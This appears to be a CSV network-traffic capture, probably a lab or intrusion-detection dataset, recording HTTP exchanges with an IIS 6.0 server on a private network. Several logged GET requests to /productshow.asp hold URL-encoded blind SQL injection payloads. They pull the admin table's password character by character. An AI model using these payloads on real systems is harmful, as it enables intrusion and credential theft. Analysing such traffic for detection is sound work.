dst_port,ip_dst,ip_src,msg,src_port,timestamp
56834,192.168.244.1,192.168.244.136,"HTTP/1.1 200 OK
Date: Sun, 24 Mar 2019 07:35:50 GMT
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Content-Length: 4358
Content-Type: text/html
Cache-control: private


<style type=""text/css"">
/* css: */
A{TEXT-DECORATION: none;}
A:link {color: #666666;}
A:visited {color: #666666}
A:active {color: #666666}
A:hover{COLOR: #FF6600;position: relative; }
BODY{
FONT-SIZE: 12px; FONT-FAMILY:  Tahoma, Verdana;
/* */
SCROLLBAR-FACE-COLOR: #F4f4f4; /* -*/
SCROLLBAR-HIGHLIGHT-COLOR: #ffffff; /* -*/
SCROLLBAR-SHADOW-COLOR: #eeeeee;  /* -*/
SCROLLBAR-3DLIGHT-COLOR: #f0f0f0;/* 3D-*/
SCROLLBAR-ARROW-COLOR: #333333; /* -*/
SCROLLBAR-TRACK-COLOR: #F7f7f7; /* -*/
SCROLLBAR-DARKSHADOW-COLOR: #333333; /* -*/
background-color: #ffffff;
margin: 0px;
}
/*  */
.xmtable{
width: 1002px;
 }
TD{
font-size: 12px; font-family: ; line-height: 18px;table-layout:fixed;word-break:break-all;
 }
option {
Font-family:Verdana, Arial, Helvetica, Sans-serif,; Text-decoration: None; Border-top-width: 1px; Border-left-width: 1px; Font-size: 12px; Border-bottom-width: 1px; Border-right-width: 1px
}
/* css:cssinput */
Input{
FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
Select{
BORDER-RIGHT: #9ad907 1px solid; BORDER-TOP: #9ad907 1px solid; FONT-SIZE: 12px; BORDER-LEFT: #9ad907 1px solid; BORDER-BOTTOM: #9ad907 1px solid; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
textarea{
	Font-family:Verdana, Arial, Helvetica, Sans-serif,;
	Text-decoration: None;
	Border-top-width: 1px;
	Border-left-width: 1px;
	Font-size: 12px;
	Border-bottom-width: 1px;
	Border-right-width: 1px;
	border-top-color:  #DBDBDB;
	border-right-color:  #DBDBDB;
	border-bottom-color:  #DBDBDB;
	border-left-color:  #DBDBDB;
}
/* ==================cssclass=""Button""================== */
.Button{
BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; FONT-SIZE: 12px; PADDING-BOTTOM: 1px; BORDER-LEFT: #cccccc 1px solid; COLOR: #ffffff; PADDING-TOP: 2px; BORDER-BOTTOM: #cccccc 1px solid; HEIGHT: 20px; BACKGROUND-COLOR: #E6320A
}
/* ==================Headcss================== */
.TOP1{
	background-image: url(Skin/8/Top_01.jpg);
	background-repeat: repeat-y;
	height: 6px;
	line-height: 6px;
}
.top2{
background:url(Skin/8/top_02.jpg);FONT-SIZE: 12px; COLOR: #5f8602; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif; height: 86px;LETTER-SPACING: 1px;
}
.top3{
	background-image: url(Skin/8/Top_03.jpg);
	background-repeat: repeat-x;
	height: 7px;
	line-height: 7px;
}
.Glow {
FILTER: Glow(Color=#E6320A, Strength=2);",80,2019/03/24 15:35:50.364677
80,192.168.244.136,192.168.244.1,,56834,2019/03/24 15:35:50.364887
80,192.168.244.136,192.168.244.1,,56834,2019/03/24 15:35:50.364901
80,192.168.244.136,192.168.244.1,,56834,2019/03/24 15:35:50.365965
80,192.168.244.136,192.168.244.1,,56834,2019/03/24 15:35:50.365977
80,192.168.244.136,192.168.244.1,,56836,2019/03/24 15:35:50.366235
56836,192.168.244.1,192.168.244.136,,80,2019/03/24 15:35:50.366248
80,192.168.244.136,192.168.244.1,,56836,2019/03/24 15:35:50.366388
80,192.168.244.136,192.168.244.1,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),16,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2055%20and%2061 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",56836,2019/03/24 15:35:50.366543
56835,192.168.244.1,192.168.244.136,"HTTP/1.1 200 OK
Date: Sun, 24 Mar 2019 07:35:50 GMT
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Content-Length: 4358
Content-Type: text/html
Cache-control: private


<style type=""text/css"">
/* css: */
A{TEXT-DECORATION: none;}
A:link {color: #666666;}
A:visited {color: #666666}
A:active {color: #666666}
A:hover{COLOR: #FF6600;position: relative; }
BODY{
FONT-SIZE: 12px; FONT-FAMILY:  Tahoma, Verdana;
/* */
SCROLLBAR-FACE-COLOR: #F4f4f4; /* -*/
SCROLLBAR-HIGHLIGHT-COLOR: #ffffff; /* -*/
SCROLLBAR-SHADOW-COLOR: #eeeeee;  /* -*/
SCROLLBAR-3DLIGHT-COLOR: #f0f0f0;/* 3D-*/
SCROLLBAR-ARROW-COLOR: #333333; /* -*/
SCROLLBAR-TRACK-COLOR: #F7f7f7; /* -*/
SCROLLBAR-DARKSHADOW-COLOR: #333333; /* -*/
background-color: #ffffff;
margin: 0px;
}
/*  */
.xmtable{
width: 1002px;
 }
TD{
font-size: 12px; font-family: ; line-height: 18px;table-layout:fixed;word-break:break-all;
 }
option {
Font-family:Verdana, Arial, Helvetica, Sans-serif,; Text-decoration: None; Border-top-width: 1px; Border-left-width: 1px; Font-size: 12px; Border-bottom-width: 1px; Border-right-width: 1px
}
/* css:cssinput */
Input{
FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
Select{
BORDER-RIGHT: #9ad907 1px solid; BORDER-TOP: #9ad907 1px solid; FONT-SIZE: 12px; BORDER-LEFT: #9ad907 1px solid; BORDER-BOTTOM: #9ad907 1px solid; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
textarea{
	Font-family:Verdana, Arial, Helvetica, Sans-serif,;
	Text-decoration: None;
	Border-top-width: 1px;
	Border-left-width: 1px;
	Font-size: 12px;
	Border-bottom-width: 1px;
	Border-right-width: 1px;
	border-top-color:  #DBDBDB;
	border-right-color:  #DBDBDB;
	border-bottom-color:  #DBDBDB;
	border-left-color:  #DBDBDB;
}
/* ==================cssclass=""Button""================== */
.Button{
BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; FONT-SIZE: 12px; PADDING-BOTTOM: 1px; BORDER-LEFT: #cccccc 1px solid; COLOR: #ffffff; PADDING-TOP: 2px; BORDER-BOTTOM: #cccccc 1px solid; HEIGHT: 20px; BACKGROUND-COLOR: #E6320A
}
/* ==================Headcss================== */
.TOP1{
	background-image: url(Skin/8/Top_01.jpg);
	background-repeat: repeat-y;
	height: 6px;
	line-height: 6px;
}
.top2{
background:url(Skin/8/top_02.jpg);FONT-SIZE: 12px; COLOR: #5f8602; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif; height: 86px;LETTER-SPACING: 1px;
}
.top3{
	background-image: url(Skin/8/Top_03.jpg);
	background-repeat: repeat-x;
	height: 7px;
	line-height: 7px;
}
.Glow {
FILTER: Glow(Color=#E6320A, Strength=2);",80,2019/03/24 15:35:50.411352
80,192.168.244.136,192.168.244.1,,56835,2019/03/24 15:35:50.411541
80,192.168.244.136,192.168.244.1,,56835,2019/03/24 15:35:50.411565
80,192.168.244.136,192.168.244.1,,56835,2019/03/24 15:35:50.412676
80,192.168.244.136,192.168.244.1,,56835,2019/03/24 15:35:50.412702
80,192.168.244.136,192.168.244.1,,56837,2019/03/24 15:35:50.412729
56837,192.168.244.1,192.168.244.136,,80,2019/03/24 15:35:50.412740
80,192.168.244.136,192.168.244.1,,56837,2019/03/24 15:35:50.413001
80,192.168.244.136,192.168.244.1,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),3,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2057%20and%2057 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",56837,2019/03/24 15:35:50.413080
56836,192.168.244.1,192.168.244.136,,80,2019/03/24 15:35:50.488917
56836,192.168.244.1,192.168.244.136,"HTTP/1.1 200 OK
Date: Sun, 24 Mar 2019 07:35:50 GMT
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Content-Length: 37030
Content-Type: text/html
Cache-control: private


<style type=""text/css"">
/* css: */
A{TEXT-DECORATION: none;}
A:link {color: #666666;}
A:visited {color: #666666}
A:active {color: #666666}
A:hover{COLOR: #FF6600;position: relative; }
BODY{
FONT-SIZE: 12px; FONT-FAMILY:  Tahoma, Verdana;
/* */
SCROLLBAR-FACE-COLOR: #F4f4f4; /* -*/
SCROLLBAR-HIGHLIGHT-COLOR: #ffffff; /* -*/
SCROLLBAR-SHADOW-COLOR: #eeeeee;  /* -*/
SCROLLBAR-3DLIGHT-COLOR: #f0f0f0;/* 3D-*/
SCROLLBAR-ARROW-COLOR: #333333; /* -*/
SCROLLBAR-TRACK-COLOR: #F7f7f7; /* -*/
SCROLLBAR-DARKSHADOW-COLOR: #333333; /* -*/
background-color: #ffffff;
margin: 0px;
}
/*  */
.xmtable{
width: 1002px;
 }
TD{
font-size: 12px; font-family: ; line-height: 18px;table-layout:fixed;word-break:break-all;
 }
option {
Font-family:Verdana, Arial, Helvetica, Sans-serif,; Text-decoration: None; Border-top-width: 1px; Border-left-width: 1px; Font-size: 12px; Border-bottom-width: 1px; Border-right-width: 1px
}
/* css:cssinput */
Input{
FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
Select{
BORDER-RIGHT: #9ad907 1px solid; BORDER-TOP: #9ad907 1px solid; FONT-SIZE: 12px; BORDER-LEFT: #9ad907 1px solid; BORDER-BOTTOM: #9ad907 1px solid; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
textarea{
	Font-family:Verdana, Arial, Helvetica, Sans-serif,;
	Text-decoration: None;
	Border-top-width: 1px;
	Border-left-width: 1px;
	Font-size: 12px;
	Border-bottom-width: 1px;
	Border-right-width: 1px;
	border-top-color:  #DBDBDB;
	border-right-color:  #DBDBDB;
	border-bottom-color:  #DBDBDB;
	border-left-color:  #DBDBDB;
}
/* ==================cssclass=""Button""================== */
.Button{
BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; FONT-SIZE: 12px; PADDING-BOTTOM: 1px; BORDER-LEFT: #cccccc 1px solid; COLOR: #ffffff; PADDING-TOP: 2px; BORDER-BOTTOM: #cccccc 1px solid; HEIGHT: 20px; BACKGROUND-COLOR: #E6320A
}
/* ==================Headcss================== */
.TOP1{
	background-image: url(Skin/8/Top_01.jpg);
	background-repeat: repeat-y;
	height: 6px;
	line-height: 6px;
}
.top2{
background:url(Skin/8/top_02.jpg);FONT-SIZE: 12px; COLOR: #5f8602; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif; height: 86px;LETTER-SPACING: 1px;
}
.top3{
	background-image: url(Skin/8/Top_03.jpg);
	background-repeat: repeat-x;
	height: 7px;
	line-height: 7px;
}
.Glow {
FILTER: Glow(Color=#E6320A, Strength=2)",80,2019/03/24 15:35:50.490521
80,192.168.244.136,192.168.244.1,,56836,2019/03/24 15:35:50.490809
80,192.168.244.136,192.168.244.1,,56836,2019/03/24 15:35:50.490848
80,192.168.244.136,192.168.244.1,,56836,2019/03/24 15:35:50.491827
80,192.168.244.136,192.168.244.1,,56836,2019/03/24 15:35:50.491846
80,192.168.244.136,192.168.244.1,,56838,2019/03/24 15:35:50.491943
56838,192.168.244.1,192.168.244.136,,80,2019/03/24 15:35:50.491956
80,192.168.244.136,192.168.244.1,,56838,2019/03/24 15:35:50.492075
80,192.168.244.136,192.168.244.1,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),7,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%20100%20and%20100 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",56838,2019/03/24 15:35:50.492239
56837,192.168.244.1,192.168.244.136,"HTTP/1.1 200 OK
Date: Sun, 24 Mar 2019 07:35:50 GMT
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Content-Length: 37030
Content-Type: text/html
Cache-control: private


<style type=""text/css"">
/* css: */
A{TEXT-DECORATION: none;}
A:link {color: #666666;}
A:visited {color: #666666}
A:active {color: #666666}
A:hover{COLOR: #FF6600;position: relative; }
BODY{
FONT-SIZE: 12px; FONT-FAMILY:  Tahoma, Verdana;
/* */
SCROLLBAR-FACE-COLOR: #F4f4f4; /* -*/
SCROLLBAR-HIGHLIGHT-COLOR: #ffffff; /* -*/
SCROLLBAR-SHADOW-COLOR: #eeeeee;  /* -*/
SCROLLBAR-3DLIGHT-COLOR: #f0f0f0;/* 3D-*/
SCROLLBAR-ARROW-COLOR: #333333; /* -*/
SCROLLBAR-TRACK-COLOR: #F7f7f7; /* -*/
SCROLLBAR-DARKSHADOW-COLOR: #333333; /* -*/
background-color: #ffffff;
margin: 0px;
}
/*  */
.xmtable{
width: 1002px;
 }
TD{
font-size: 12px; font-family: ; line-height: 18px;table-layout:fixed;word-break:break-all;
 }
option {
Font-family:Verdana, Arial, Helvetica, Sans-serif,; Text-decoration: None; Border-top-width: 1px; Border-left-width: 1px; Font-size: 12px; Border-bottom-width: 1px; Border-right-width: 1px
}
/* css:cssinput */
Input{
FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
Select{
BORDER-RIGHT: #9ad907 1px solid; BORDER-TOP: #9ad907 1px solid; FONT-SIZE: 12px; BORDER-LEFT: #9ad907 1px solid; BORDER-BOTTOM: #9ad907 1px solid; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
textarea{
	Font-family:Verdana, Arial, Helvetica, Sans-serif,;
	Text-decoration: None;
	Border-top-width: 1px;
	Border-left-width: 1px;
	Font-size: 12px;
	Border-bottom-width: 1px;
	Border-right-width: 1px;
	border-top-color:  #DBDBDB;
	border-right-color:  #DBDBDB;
	border-bottom-color:  #DBDBDB;
	border-left-color:  #DBDBDB;
}
/* ==================cssclass=""Button""================== */
.Button{
BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; FONT-SIZE: 12px; PADDING-BOTTOM: 1px; BORDER-LEFT: #cccccc 1px solid; COLOR: #ffffff; PADDING-TOP: 2px; BORDER-BOTTOM: #cccccc 1px solid; HEIGHT: 20px; BACKGROUND-COLOR: #E6320A
}
/* ==================Headcss================== */
.TOP1{
	background-image: url(Skin/8/Top_01.jpg);
	background-repeat: repeat-y;
	height: 6px;
	line-height: 6px;
}
.top2{
background:url(Skin/8/top_02.jpg);FONT-SIZE: 12px; COLOR: #5f8602; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif; height: 86px;LETTER-SPACING: 1px;
}
.top3{
	background-image: url(Skin/8/Top_03.jpg);
	background-repeat: repeat-x;
	height: 7px;
	line-height: 7px;
}
.Glow {
FILTER: Glow(Color=#E6320A, Strength=2)",80,2019/03/24 15:35:50.552348
80,192.168.244.136,192.168.244.1,,56837,2019/03/24 15:35:50.552563
80,192.168.244.136,192.168.244.1,,56837,2019/03/24 15:35:50.552574
80,192.168.244.136,192.168.244.1,,56837,2019/03/24 15:35:50.554448
80,192.168.244.136,192.168.244.1,,56837,2019/03/24 15:35:50.554502
80,192.168.244.136,192.168.244.1,,56839,2019/03/24 15:35:50.555032
56839,192.168.244.1,192.168.244.136,,80,2019/03/24 15:35:50.555085
80,192.168.244.136,192.168.244.1,,56839,2019/03/24 15:35:50.555376
80,192.168.244.136,192.168.244.1,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),11,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2048%20and%2050 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",56839,2019/03/24 15:35:50.555560
56838,192.168.244.1,192.168.244.136,"HTTP/1.1 200 OK
Date: Sun, 24 Mar 2019 07:35:50 GMT
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Content-Length: 37030
Content-Type: text/html
Cache-control: private


<style type=""text/css"">
/* css: */
A{TEXT-DECORATION: none;}
A:link {color: #666666;}
A:visited {color: #666666}
A:active {color: #666666}
A:hover{COLOR: #FF6600;position: relative; }
BODY{
FONT-SIZE: 12px; FONT-FAMILY:  Tahoma, Verdana;
/* */
SCROLLBAR-FACE-COLOR: #F4f4f4; /* -*/
SCROLLBAR-HIGHLIGHT-COLOR: #ffffff; /* -*/
SCROLLBAR-SHADOW-COLOR: #eeeeee;  /* -*/
SCROLLBAR-3DLIGHT-COLOR: #f0f0f0;/* 3D-*/
SCROLLBAR-ARROW-COLOR: #333333; /* -*/
SCROLLBAR-TRACK-COLOR: #F7f7f7; /* -*/
SCROLLBAR-DARKSHADOW-COLOR: #333333; /* -*/
background-color: #ffffff;
margin: 0px;
}
/*  */
.xmtable{
width: 1002px;
 }
TD{
font-size: 12px; font-family: ; line-height: 18px;table-layout:fixed;word-break:break-all;
 }
option {
Font-family:Verdana, Arial, Helvetica, Sans-serif,; Text-decoration: None; Border-top-width: 1px; Border-left-width: 1px; Font-size: 12px; Border-bottom-width: 1px; Border-right-width: 1px
}
/* css:cssinput */
Input{
FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
Select{
BORDER-RIGHT: #9ad907 1px solid; BORDER-TOP: #9ad907 1px solid; FONT-SIZE: 12px; BORDER-LEFT: #9ad907 1px solid; BORDER-BOTTOM: #9ad907 1px solid; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
textarea{
	Font-family:Verdana, Arial, Helvetica, Sans-serif,;
	Text-decoration: None;
	Border-top-width: 1px;
	Border-left-width: 1px;
	Font-size: 12px;
	Border-bottom-width: 1px;
	Border-right-width: 1px;
	border-top-color:  #DBDBDB;
	border-right-color:  #DBDBDB;
	border-bottom-color:  #DBDBDB;
	border-left-color:  #DBDBDB;
}
/* ==================cssclass=""Button""================== */
.Button{
BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; FONT-SIZE: 12px; PADDING-BOTTOM: 1px; BORDER-LEFT: #cccccc 1px solid; COLOR: #ffffff; PADDING-TOP: 2px; BORDER-BOTTOM: #cccccc 1px solid; HEIGHT: 20px; BACKGROUND-COLOR: #E6320A
}
/* ==================Headcss================== */
.TOP1{
	background-image: url(Skin/8/Top_01.jpg);
	background-repeat: repeat-y;
	height: 6px;
	line-height: 6px;
}
.top2{
background:url(Skin/8/top_02.jpg);FONT-SIZE: 12px; COLOR: #5f8602; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif; height: 86px;LETTER-SPACING: 1px;
}
.top3{
	background-image: url(Skin/8/Top_03.jpg);
	background-repeat: repeat-x;
	height: 7px;
	line-height: 7px;
}
.Glow {
FILTER: Glow(Color=#E6320A, Strength=2)",80,2019/03/24 15:35:50.614585
80,192.168.244.136,192.168.244.1,,56838,2019/03/24 15:35:50.614778
80,192.168.244.136,192.168.244.1,,56838,2019/03/24 15:35:50.614787
80,192.168.244.136,192.168.244.1,,56838,2019/03/24 15:35:50.615893
80,192.168.244.136,192.168.244.1,,56838,2019/03/24 15:35:50.615903
80,192.168.244.136,192.168.244.1,,56840,2019/03/24 15:35:50.615928
56840,192.168.244.1,192.168.244.136,,80,2019/03/24 15:35:50.615939
80,192.168.244.136,192.168.244.1,,56840,2019/03/24 15:35:50.616082
80,192.168.244.136,192.168.244.1,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),5,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2056%20and%2056 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",56840,2019/03/24 15:35:50.616223
56839,192.168.244.1,192.168.244.136,"HTTP/1.1 200 OK
Date: Sun, 24 Mar 2019 07:35:50 GMT
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Content-Length: 37030
Content-Type: text/html
Cache-control: private


<style type=""text/css"">
/* css: */
A{TEXT-DECORATION: none;}
A:link {color: #666666;}
A:visited {color: #666666}
A:active {color: #666666}
A:hover{COLOR: #FF6600;position: relative; }
BODY{
FONT-SIZE: 12px; FONT-FAMILY:  Tahoma, Verdana;
/* */
SCROLLBAR-FACE-COLOR: #F4f4f4; /* -*/
SCROLLBAR-HIGHLIGHT-COLOR: #ffffff; /* -*/
SCROLLBAR-SHADOW-COLOR: #eeeeee;  /* -*/
SCROLLBAR-3DLIGHT-COLOR: #f0f0f0;/* 3D-*/
SCROLLBAR-ARROW-COLOR: #333333; /* -*/
SCROLLBAR-TRACK-COLOR: #F7f7f7; /* -*/
SCROLLBAR-DARKSHADOW-COLOR: #333333; /* -*/
background-color: #ffffff;
margin: 0px;
}
/*  */
.xmtable{
width: 1002px;
 }
TD{
font-size: 12px; font-family: ; line-height: 18px;table-layout:fixed;word-break:break-all;
 }
option {
Font-family:Verdana, Arial, Helvetica, Sans-serif,; Text-decoration: None; Border-top-width: 1px; Border-left-width: 1px; Font-size: 12px; Border-bottom-width: 1px; Border-right-width: 1px
}
/* css:cssinput */
Input{
FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
Select{
BORDER-RIGHT: #9ad907 1px solid; BORDER-TOP: #9ad907 1px solid; FONT-SIZE: 12px; BORDER-LEFT: #9ad907 1px solid; BORDER-BOTTOM: #9ad907 1px solid; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif;  BACKGROUND-COLOR: #f5f5f5
}
textarea{
	Font-family:Verdana, Arial, Helvetica, Sans-serif,;
	Text-decoration: None;
	Border-top-width: 1px;
	Border-left-width: 1px;
	Font-size: 12px;
	Border-bottom-width: 1px;
	Border-right-width: 1px;
	border-top-color:  #DBDBDB;
	border-right-color:  #DBDBDB;
	border-bottom-color:  #DBDBDB;
	border-left-color:  #DBDBDB;
}
/* ==================cssclass=""Button""================== */
.Button{
BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; FONT-SIZE: 12px; PADDING-BOTTOM: 1px; BORDER-LEFT: #cccccc 1px solid; COLOR: #ffffff; PADDING-TOP: 2px; BORDER-BOTTOM: #cccccc 1px solid; HEIGHT: 20px; BACKGROUND-COLOR: #E6320A
}
/* ==================Headcss================== */
.TOP1{
	background-image: url(Skin/8/Top_01.jpg);
	background-repeat: repeat-y;
	height: 6px;
	line-height: 6px;
}
.top2{
background:url(Skin/8/top_02.jpg);FONT-SIZE: 12px; COLOR: #5f8602; FONT-FAMILY: Geneva, Arial, Helvetica, sans-serif; height: 86px;LETTER-SPACING: 1px;
}
.top3{
	background-image: url(Skin/8/Top_03.jpg);
	background-repeat: repeat-x;
	height: 7px;
	line-height: 7px;
}
.Glow {
FILTER: Glow(Color=#E6320A, Strength=2)",80,2019/03/24 15:35:50.677104
80,192.168.244.136,192.168.244.1,,56839,2019/03/24 15:35:50.677339
80,192.168.244.136,192.168.244.1,,56839,2019/03/24 15:35:50.677350
80,192.168.244.136,192.168.244.1,,56839,2019/03/24 15:35:50.678364
80,192.168.244.136,192.168.244.1,,56839,2019/03/24 15:35:50.678389
80,192.168.244.136,192.168.244.1,,56841,2019/03/24 15:35:50.678578
56841,192.168.244.1,192.168.244.136,,80,2019/03/24 15:35:50.678591
80,192.168.244.136,192.168.244.1,,56841,2019/03/24 15:35:50.678731
80,192.168.244.136,192.168.244.1,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),12,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2048%20and%2050 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",56841,2019/03/24 15:35:50.678880
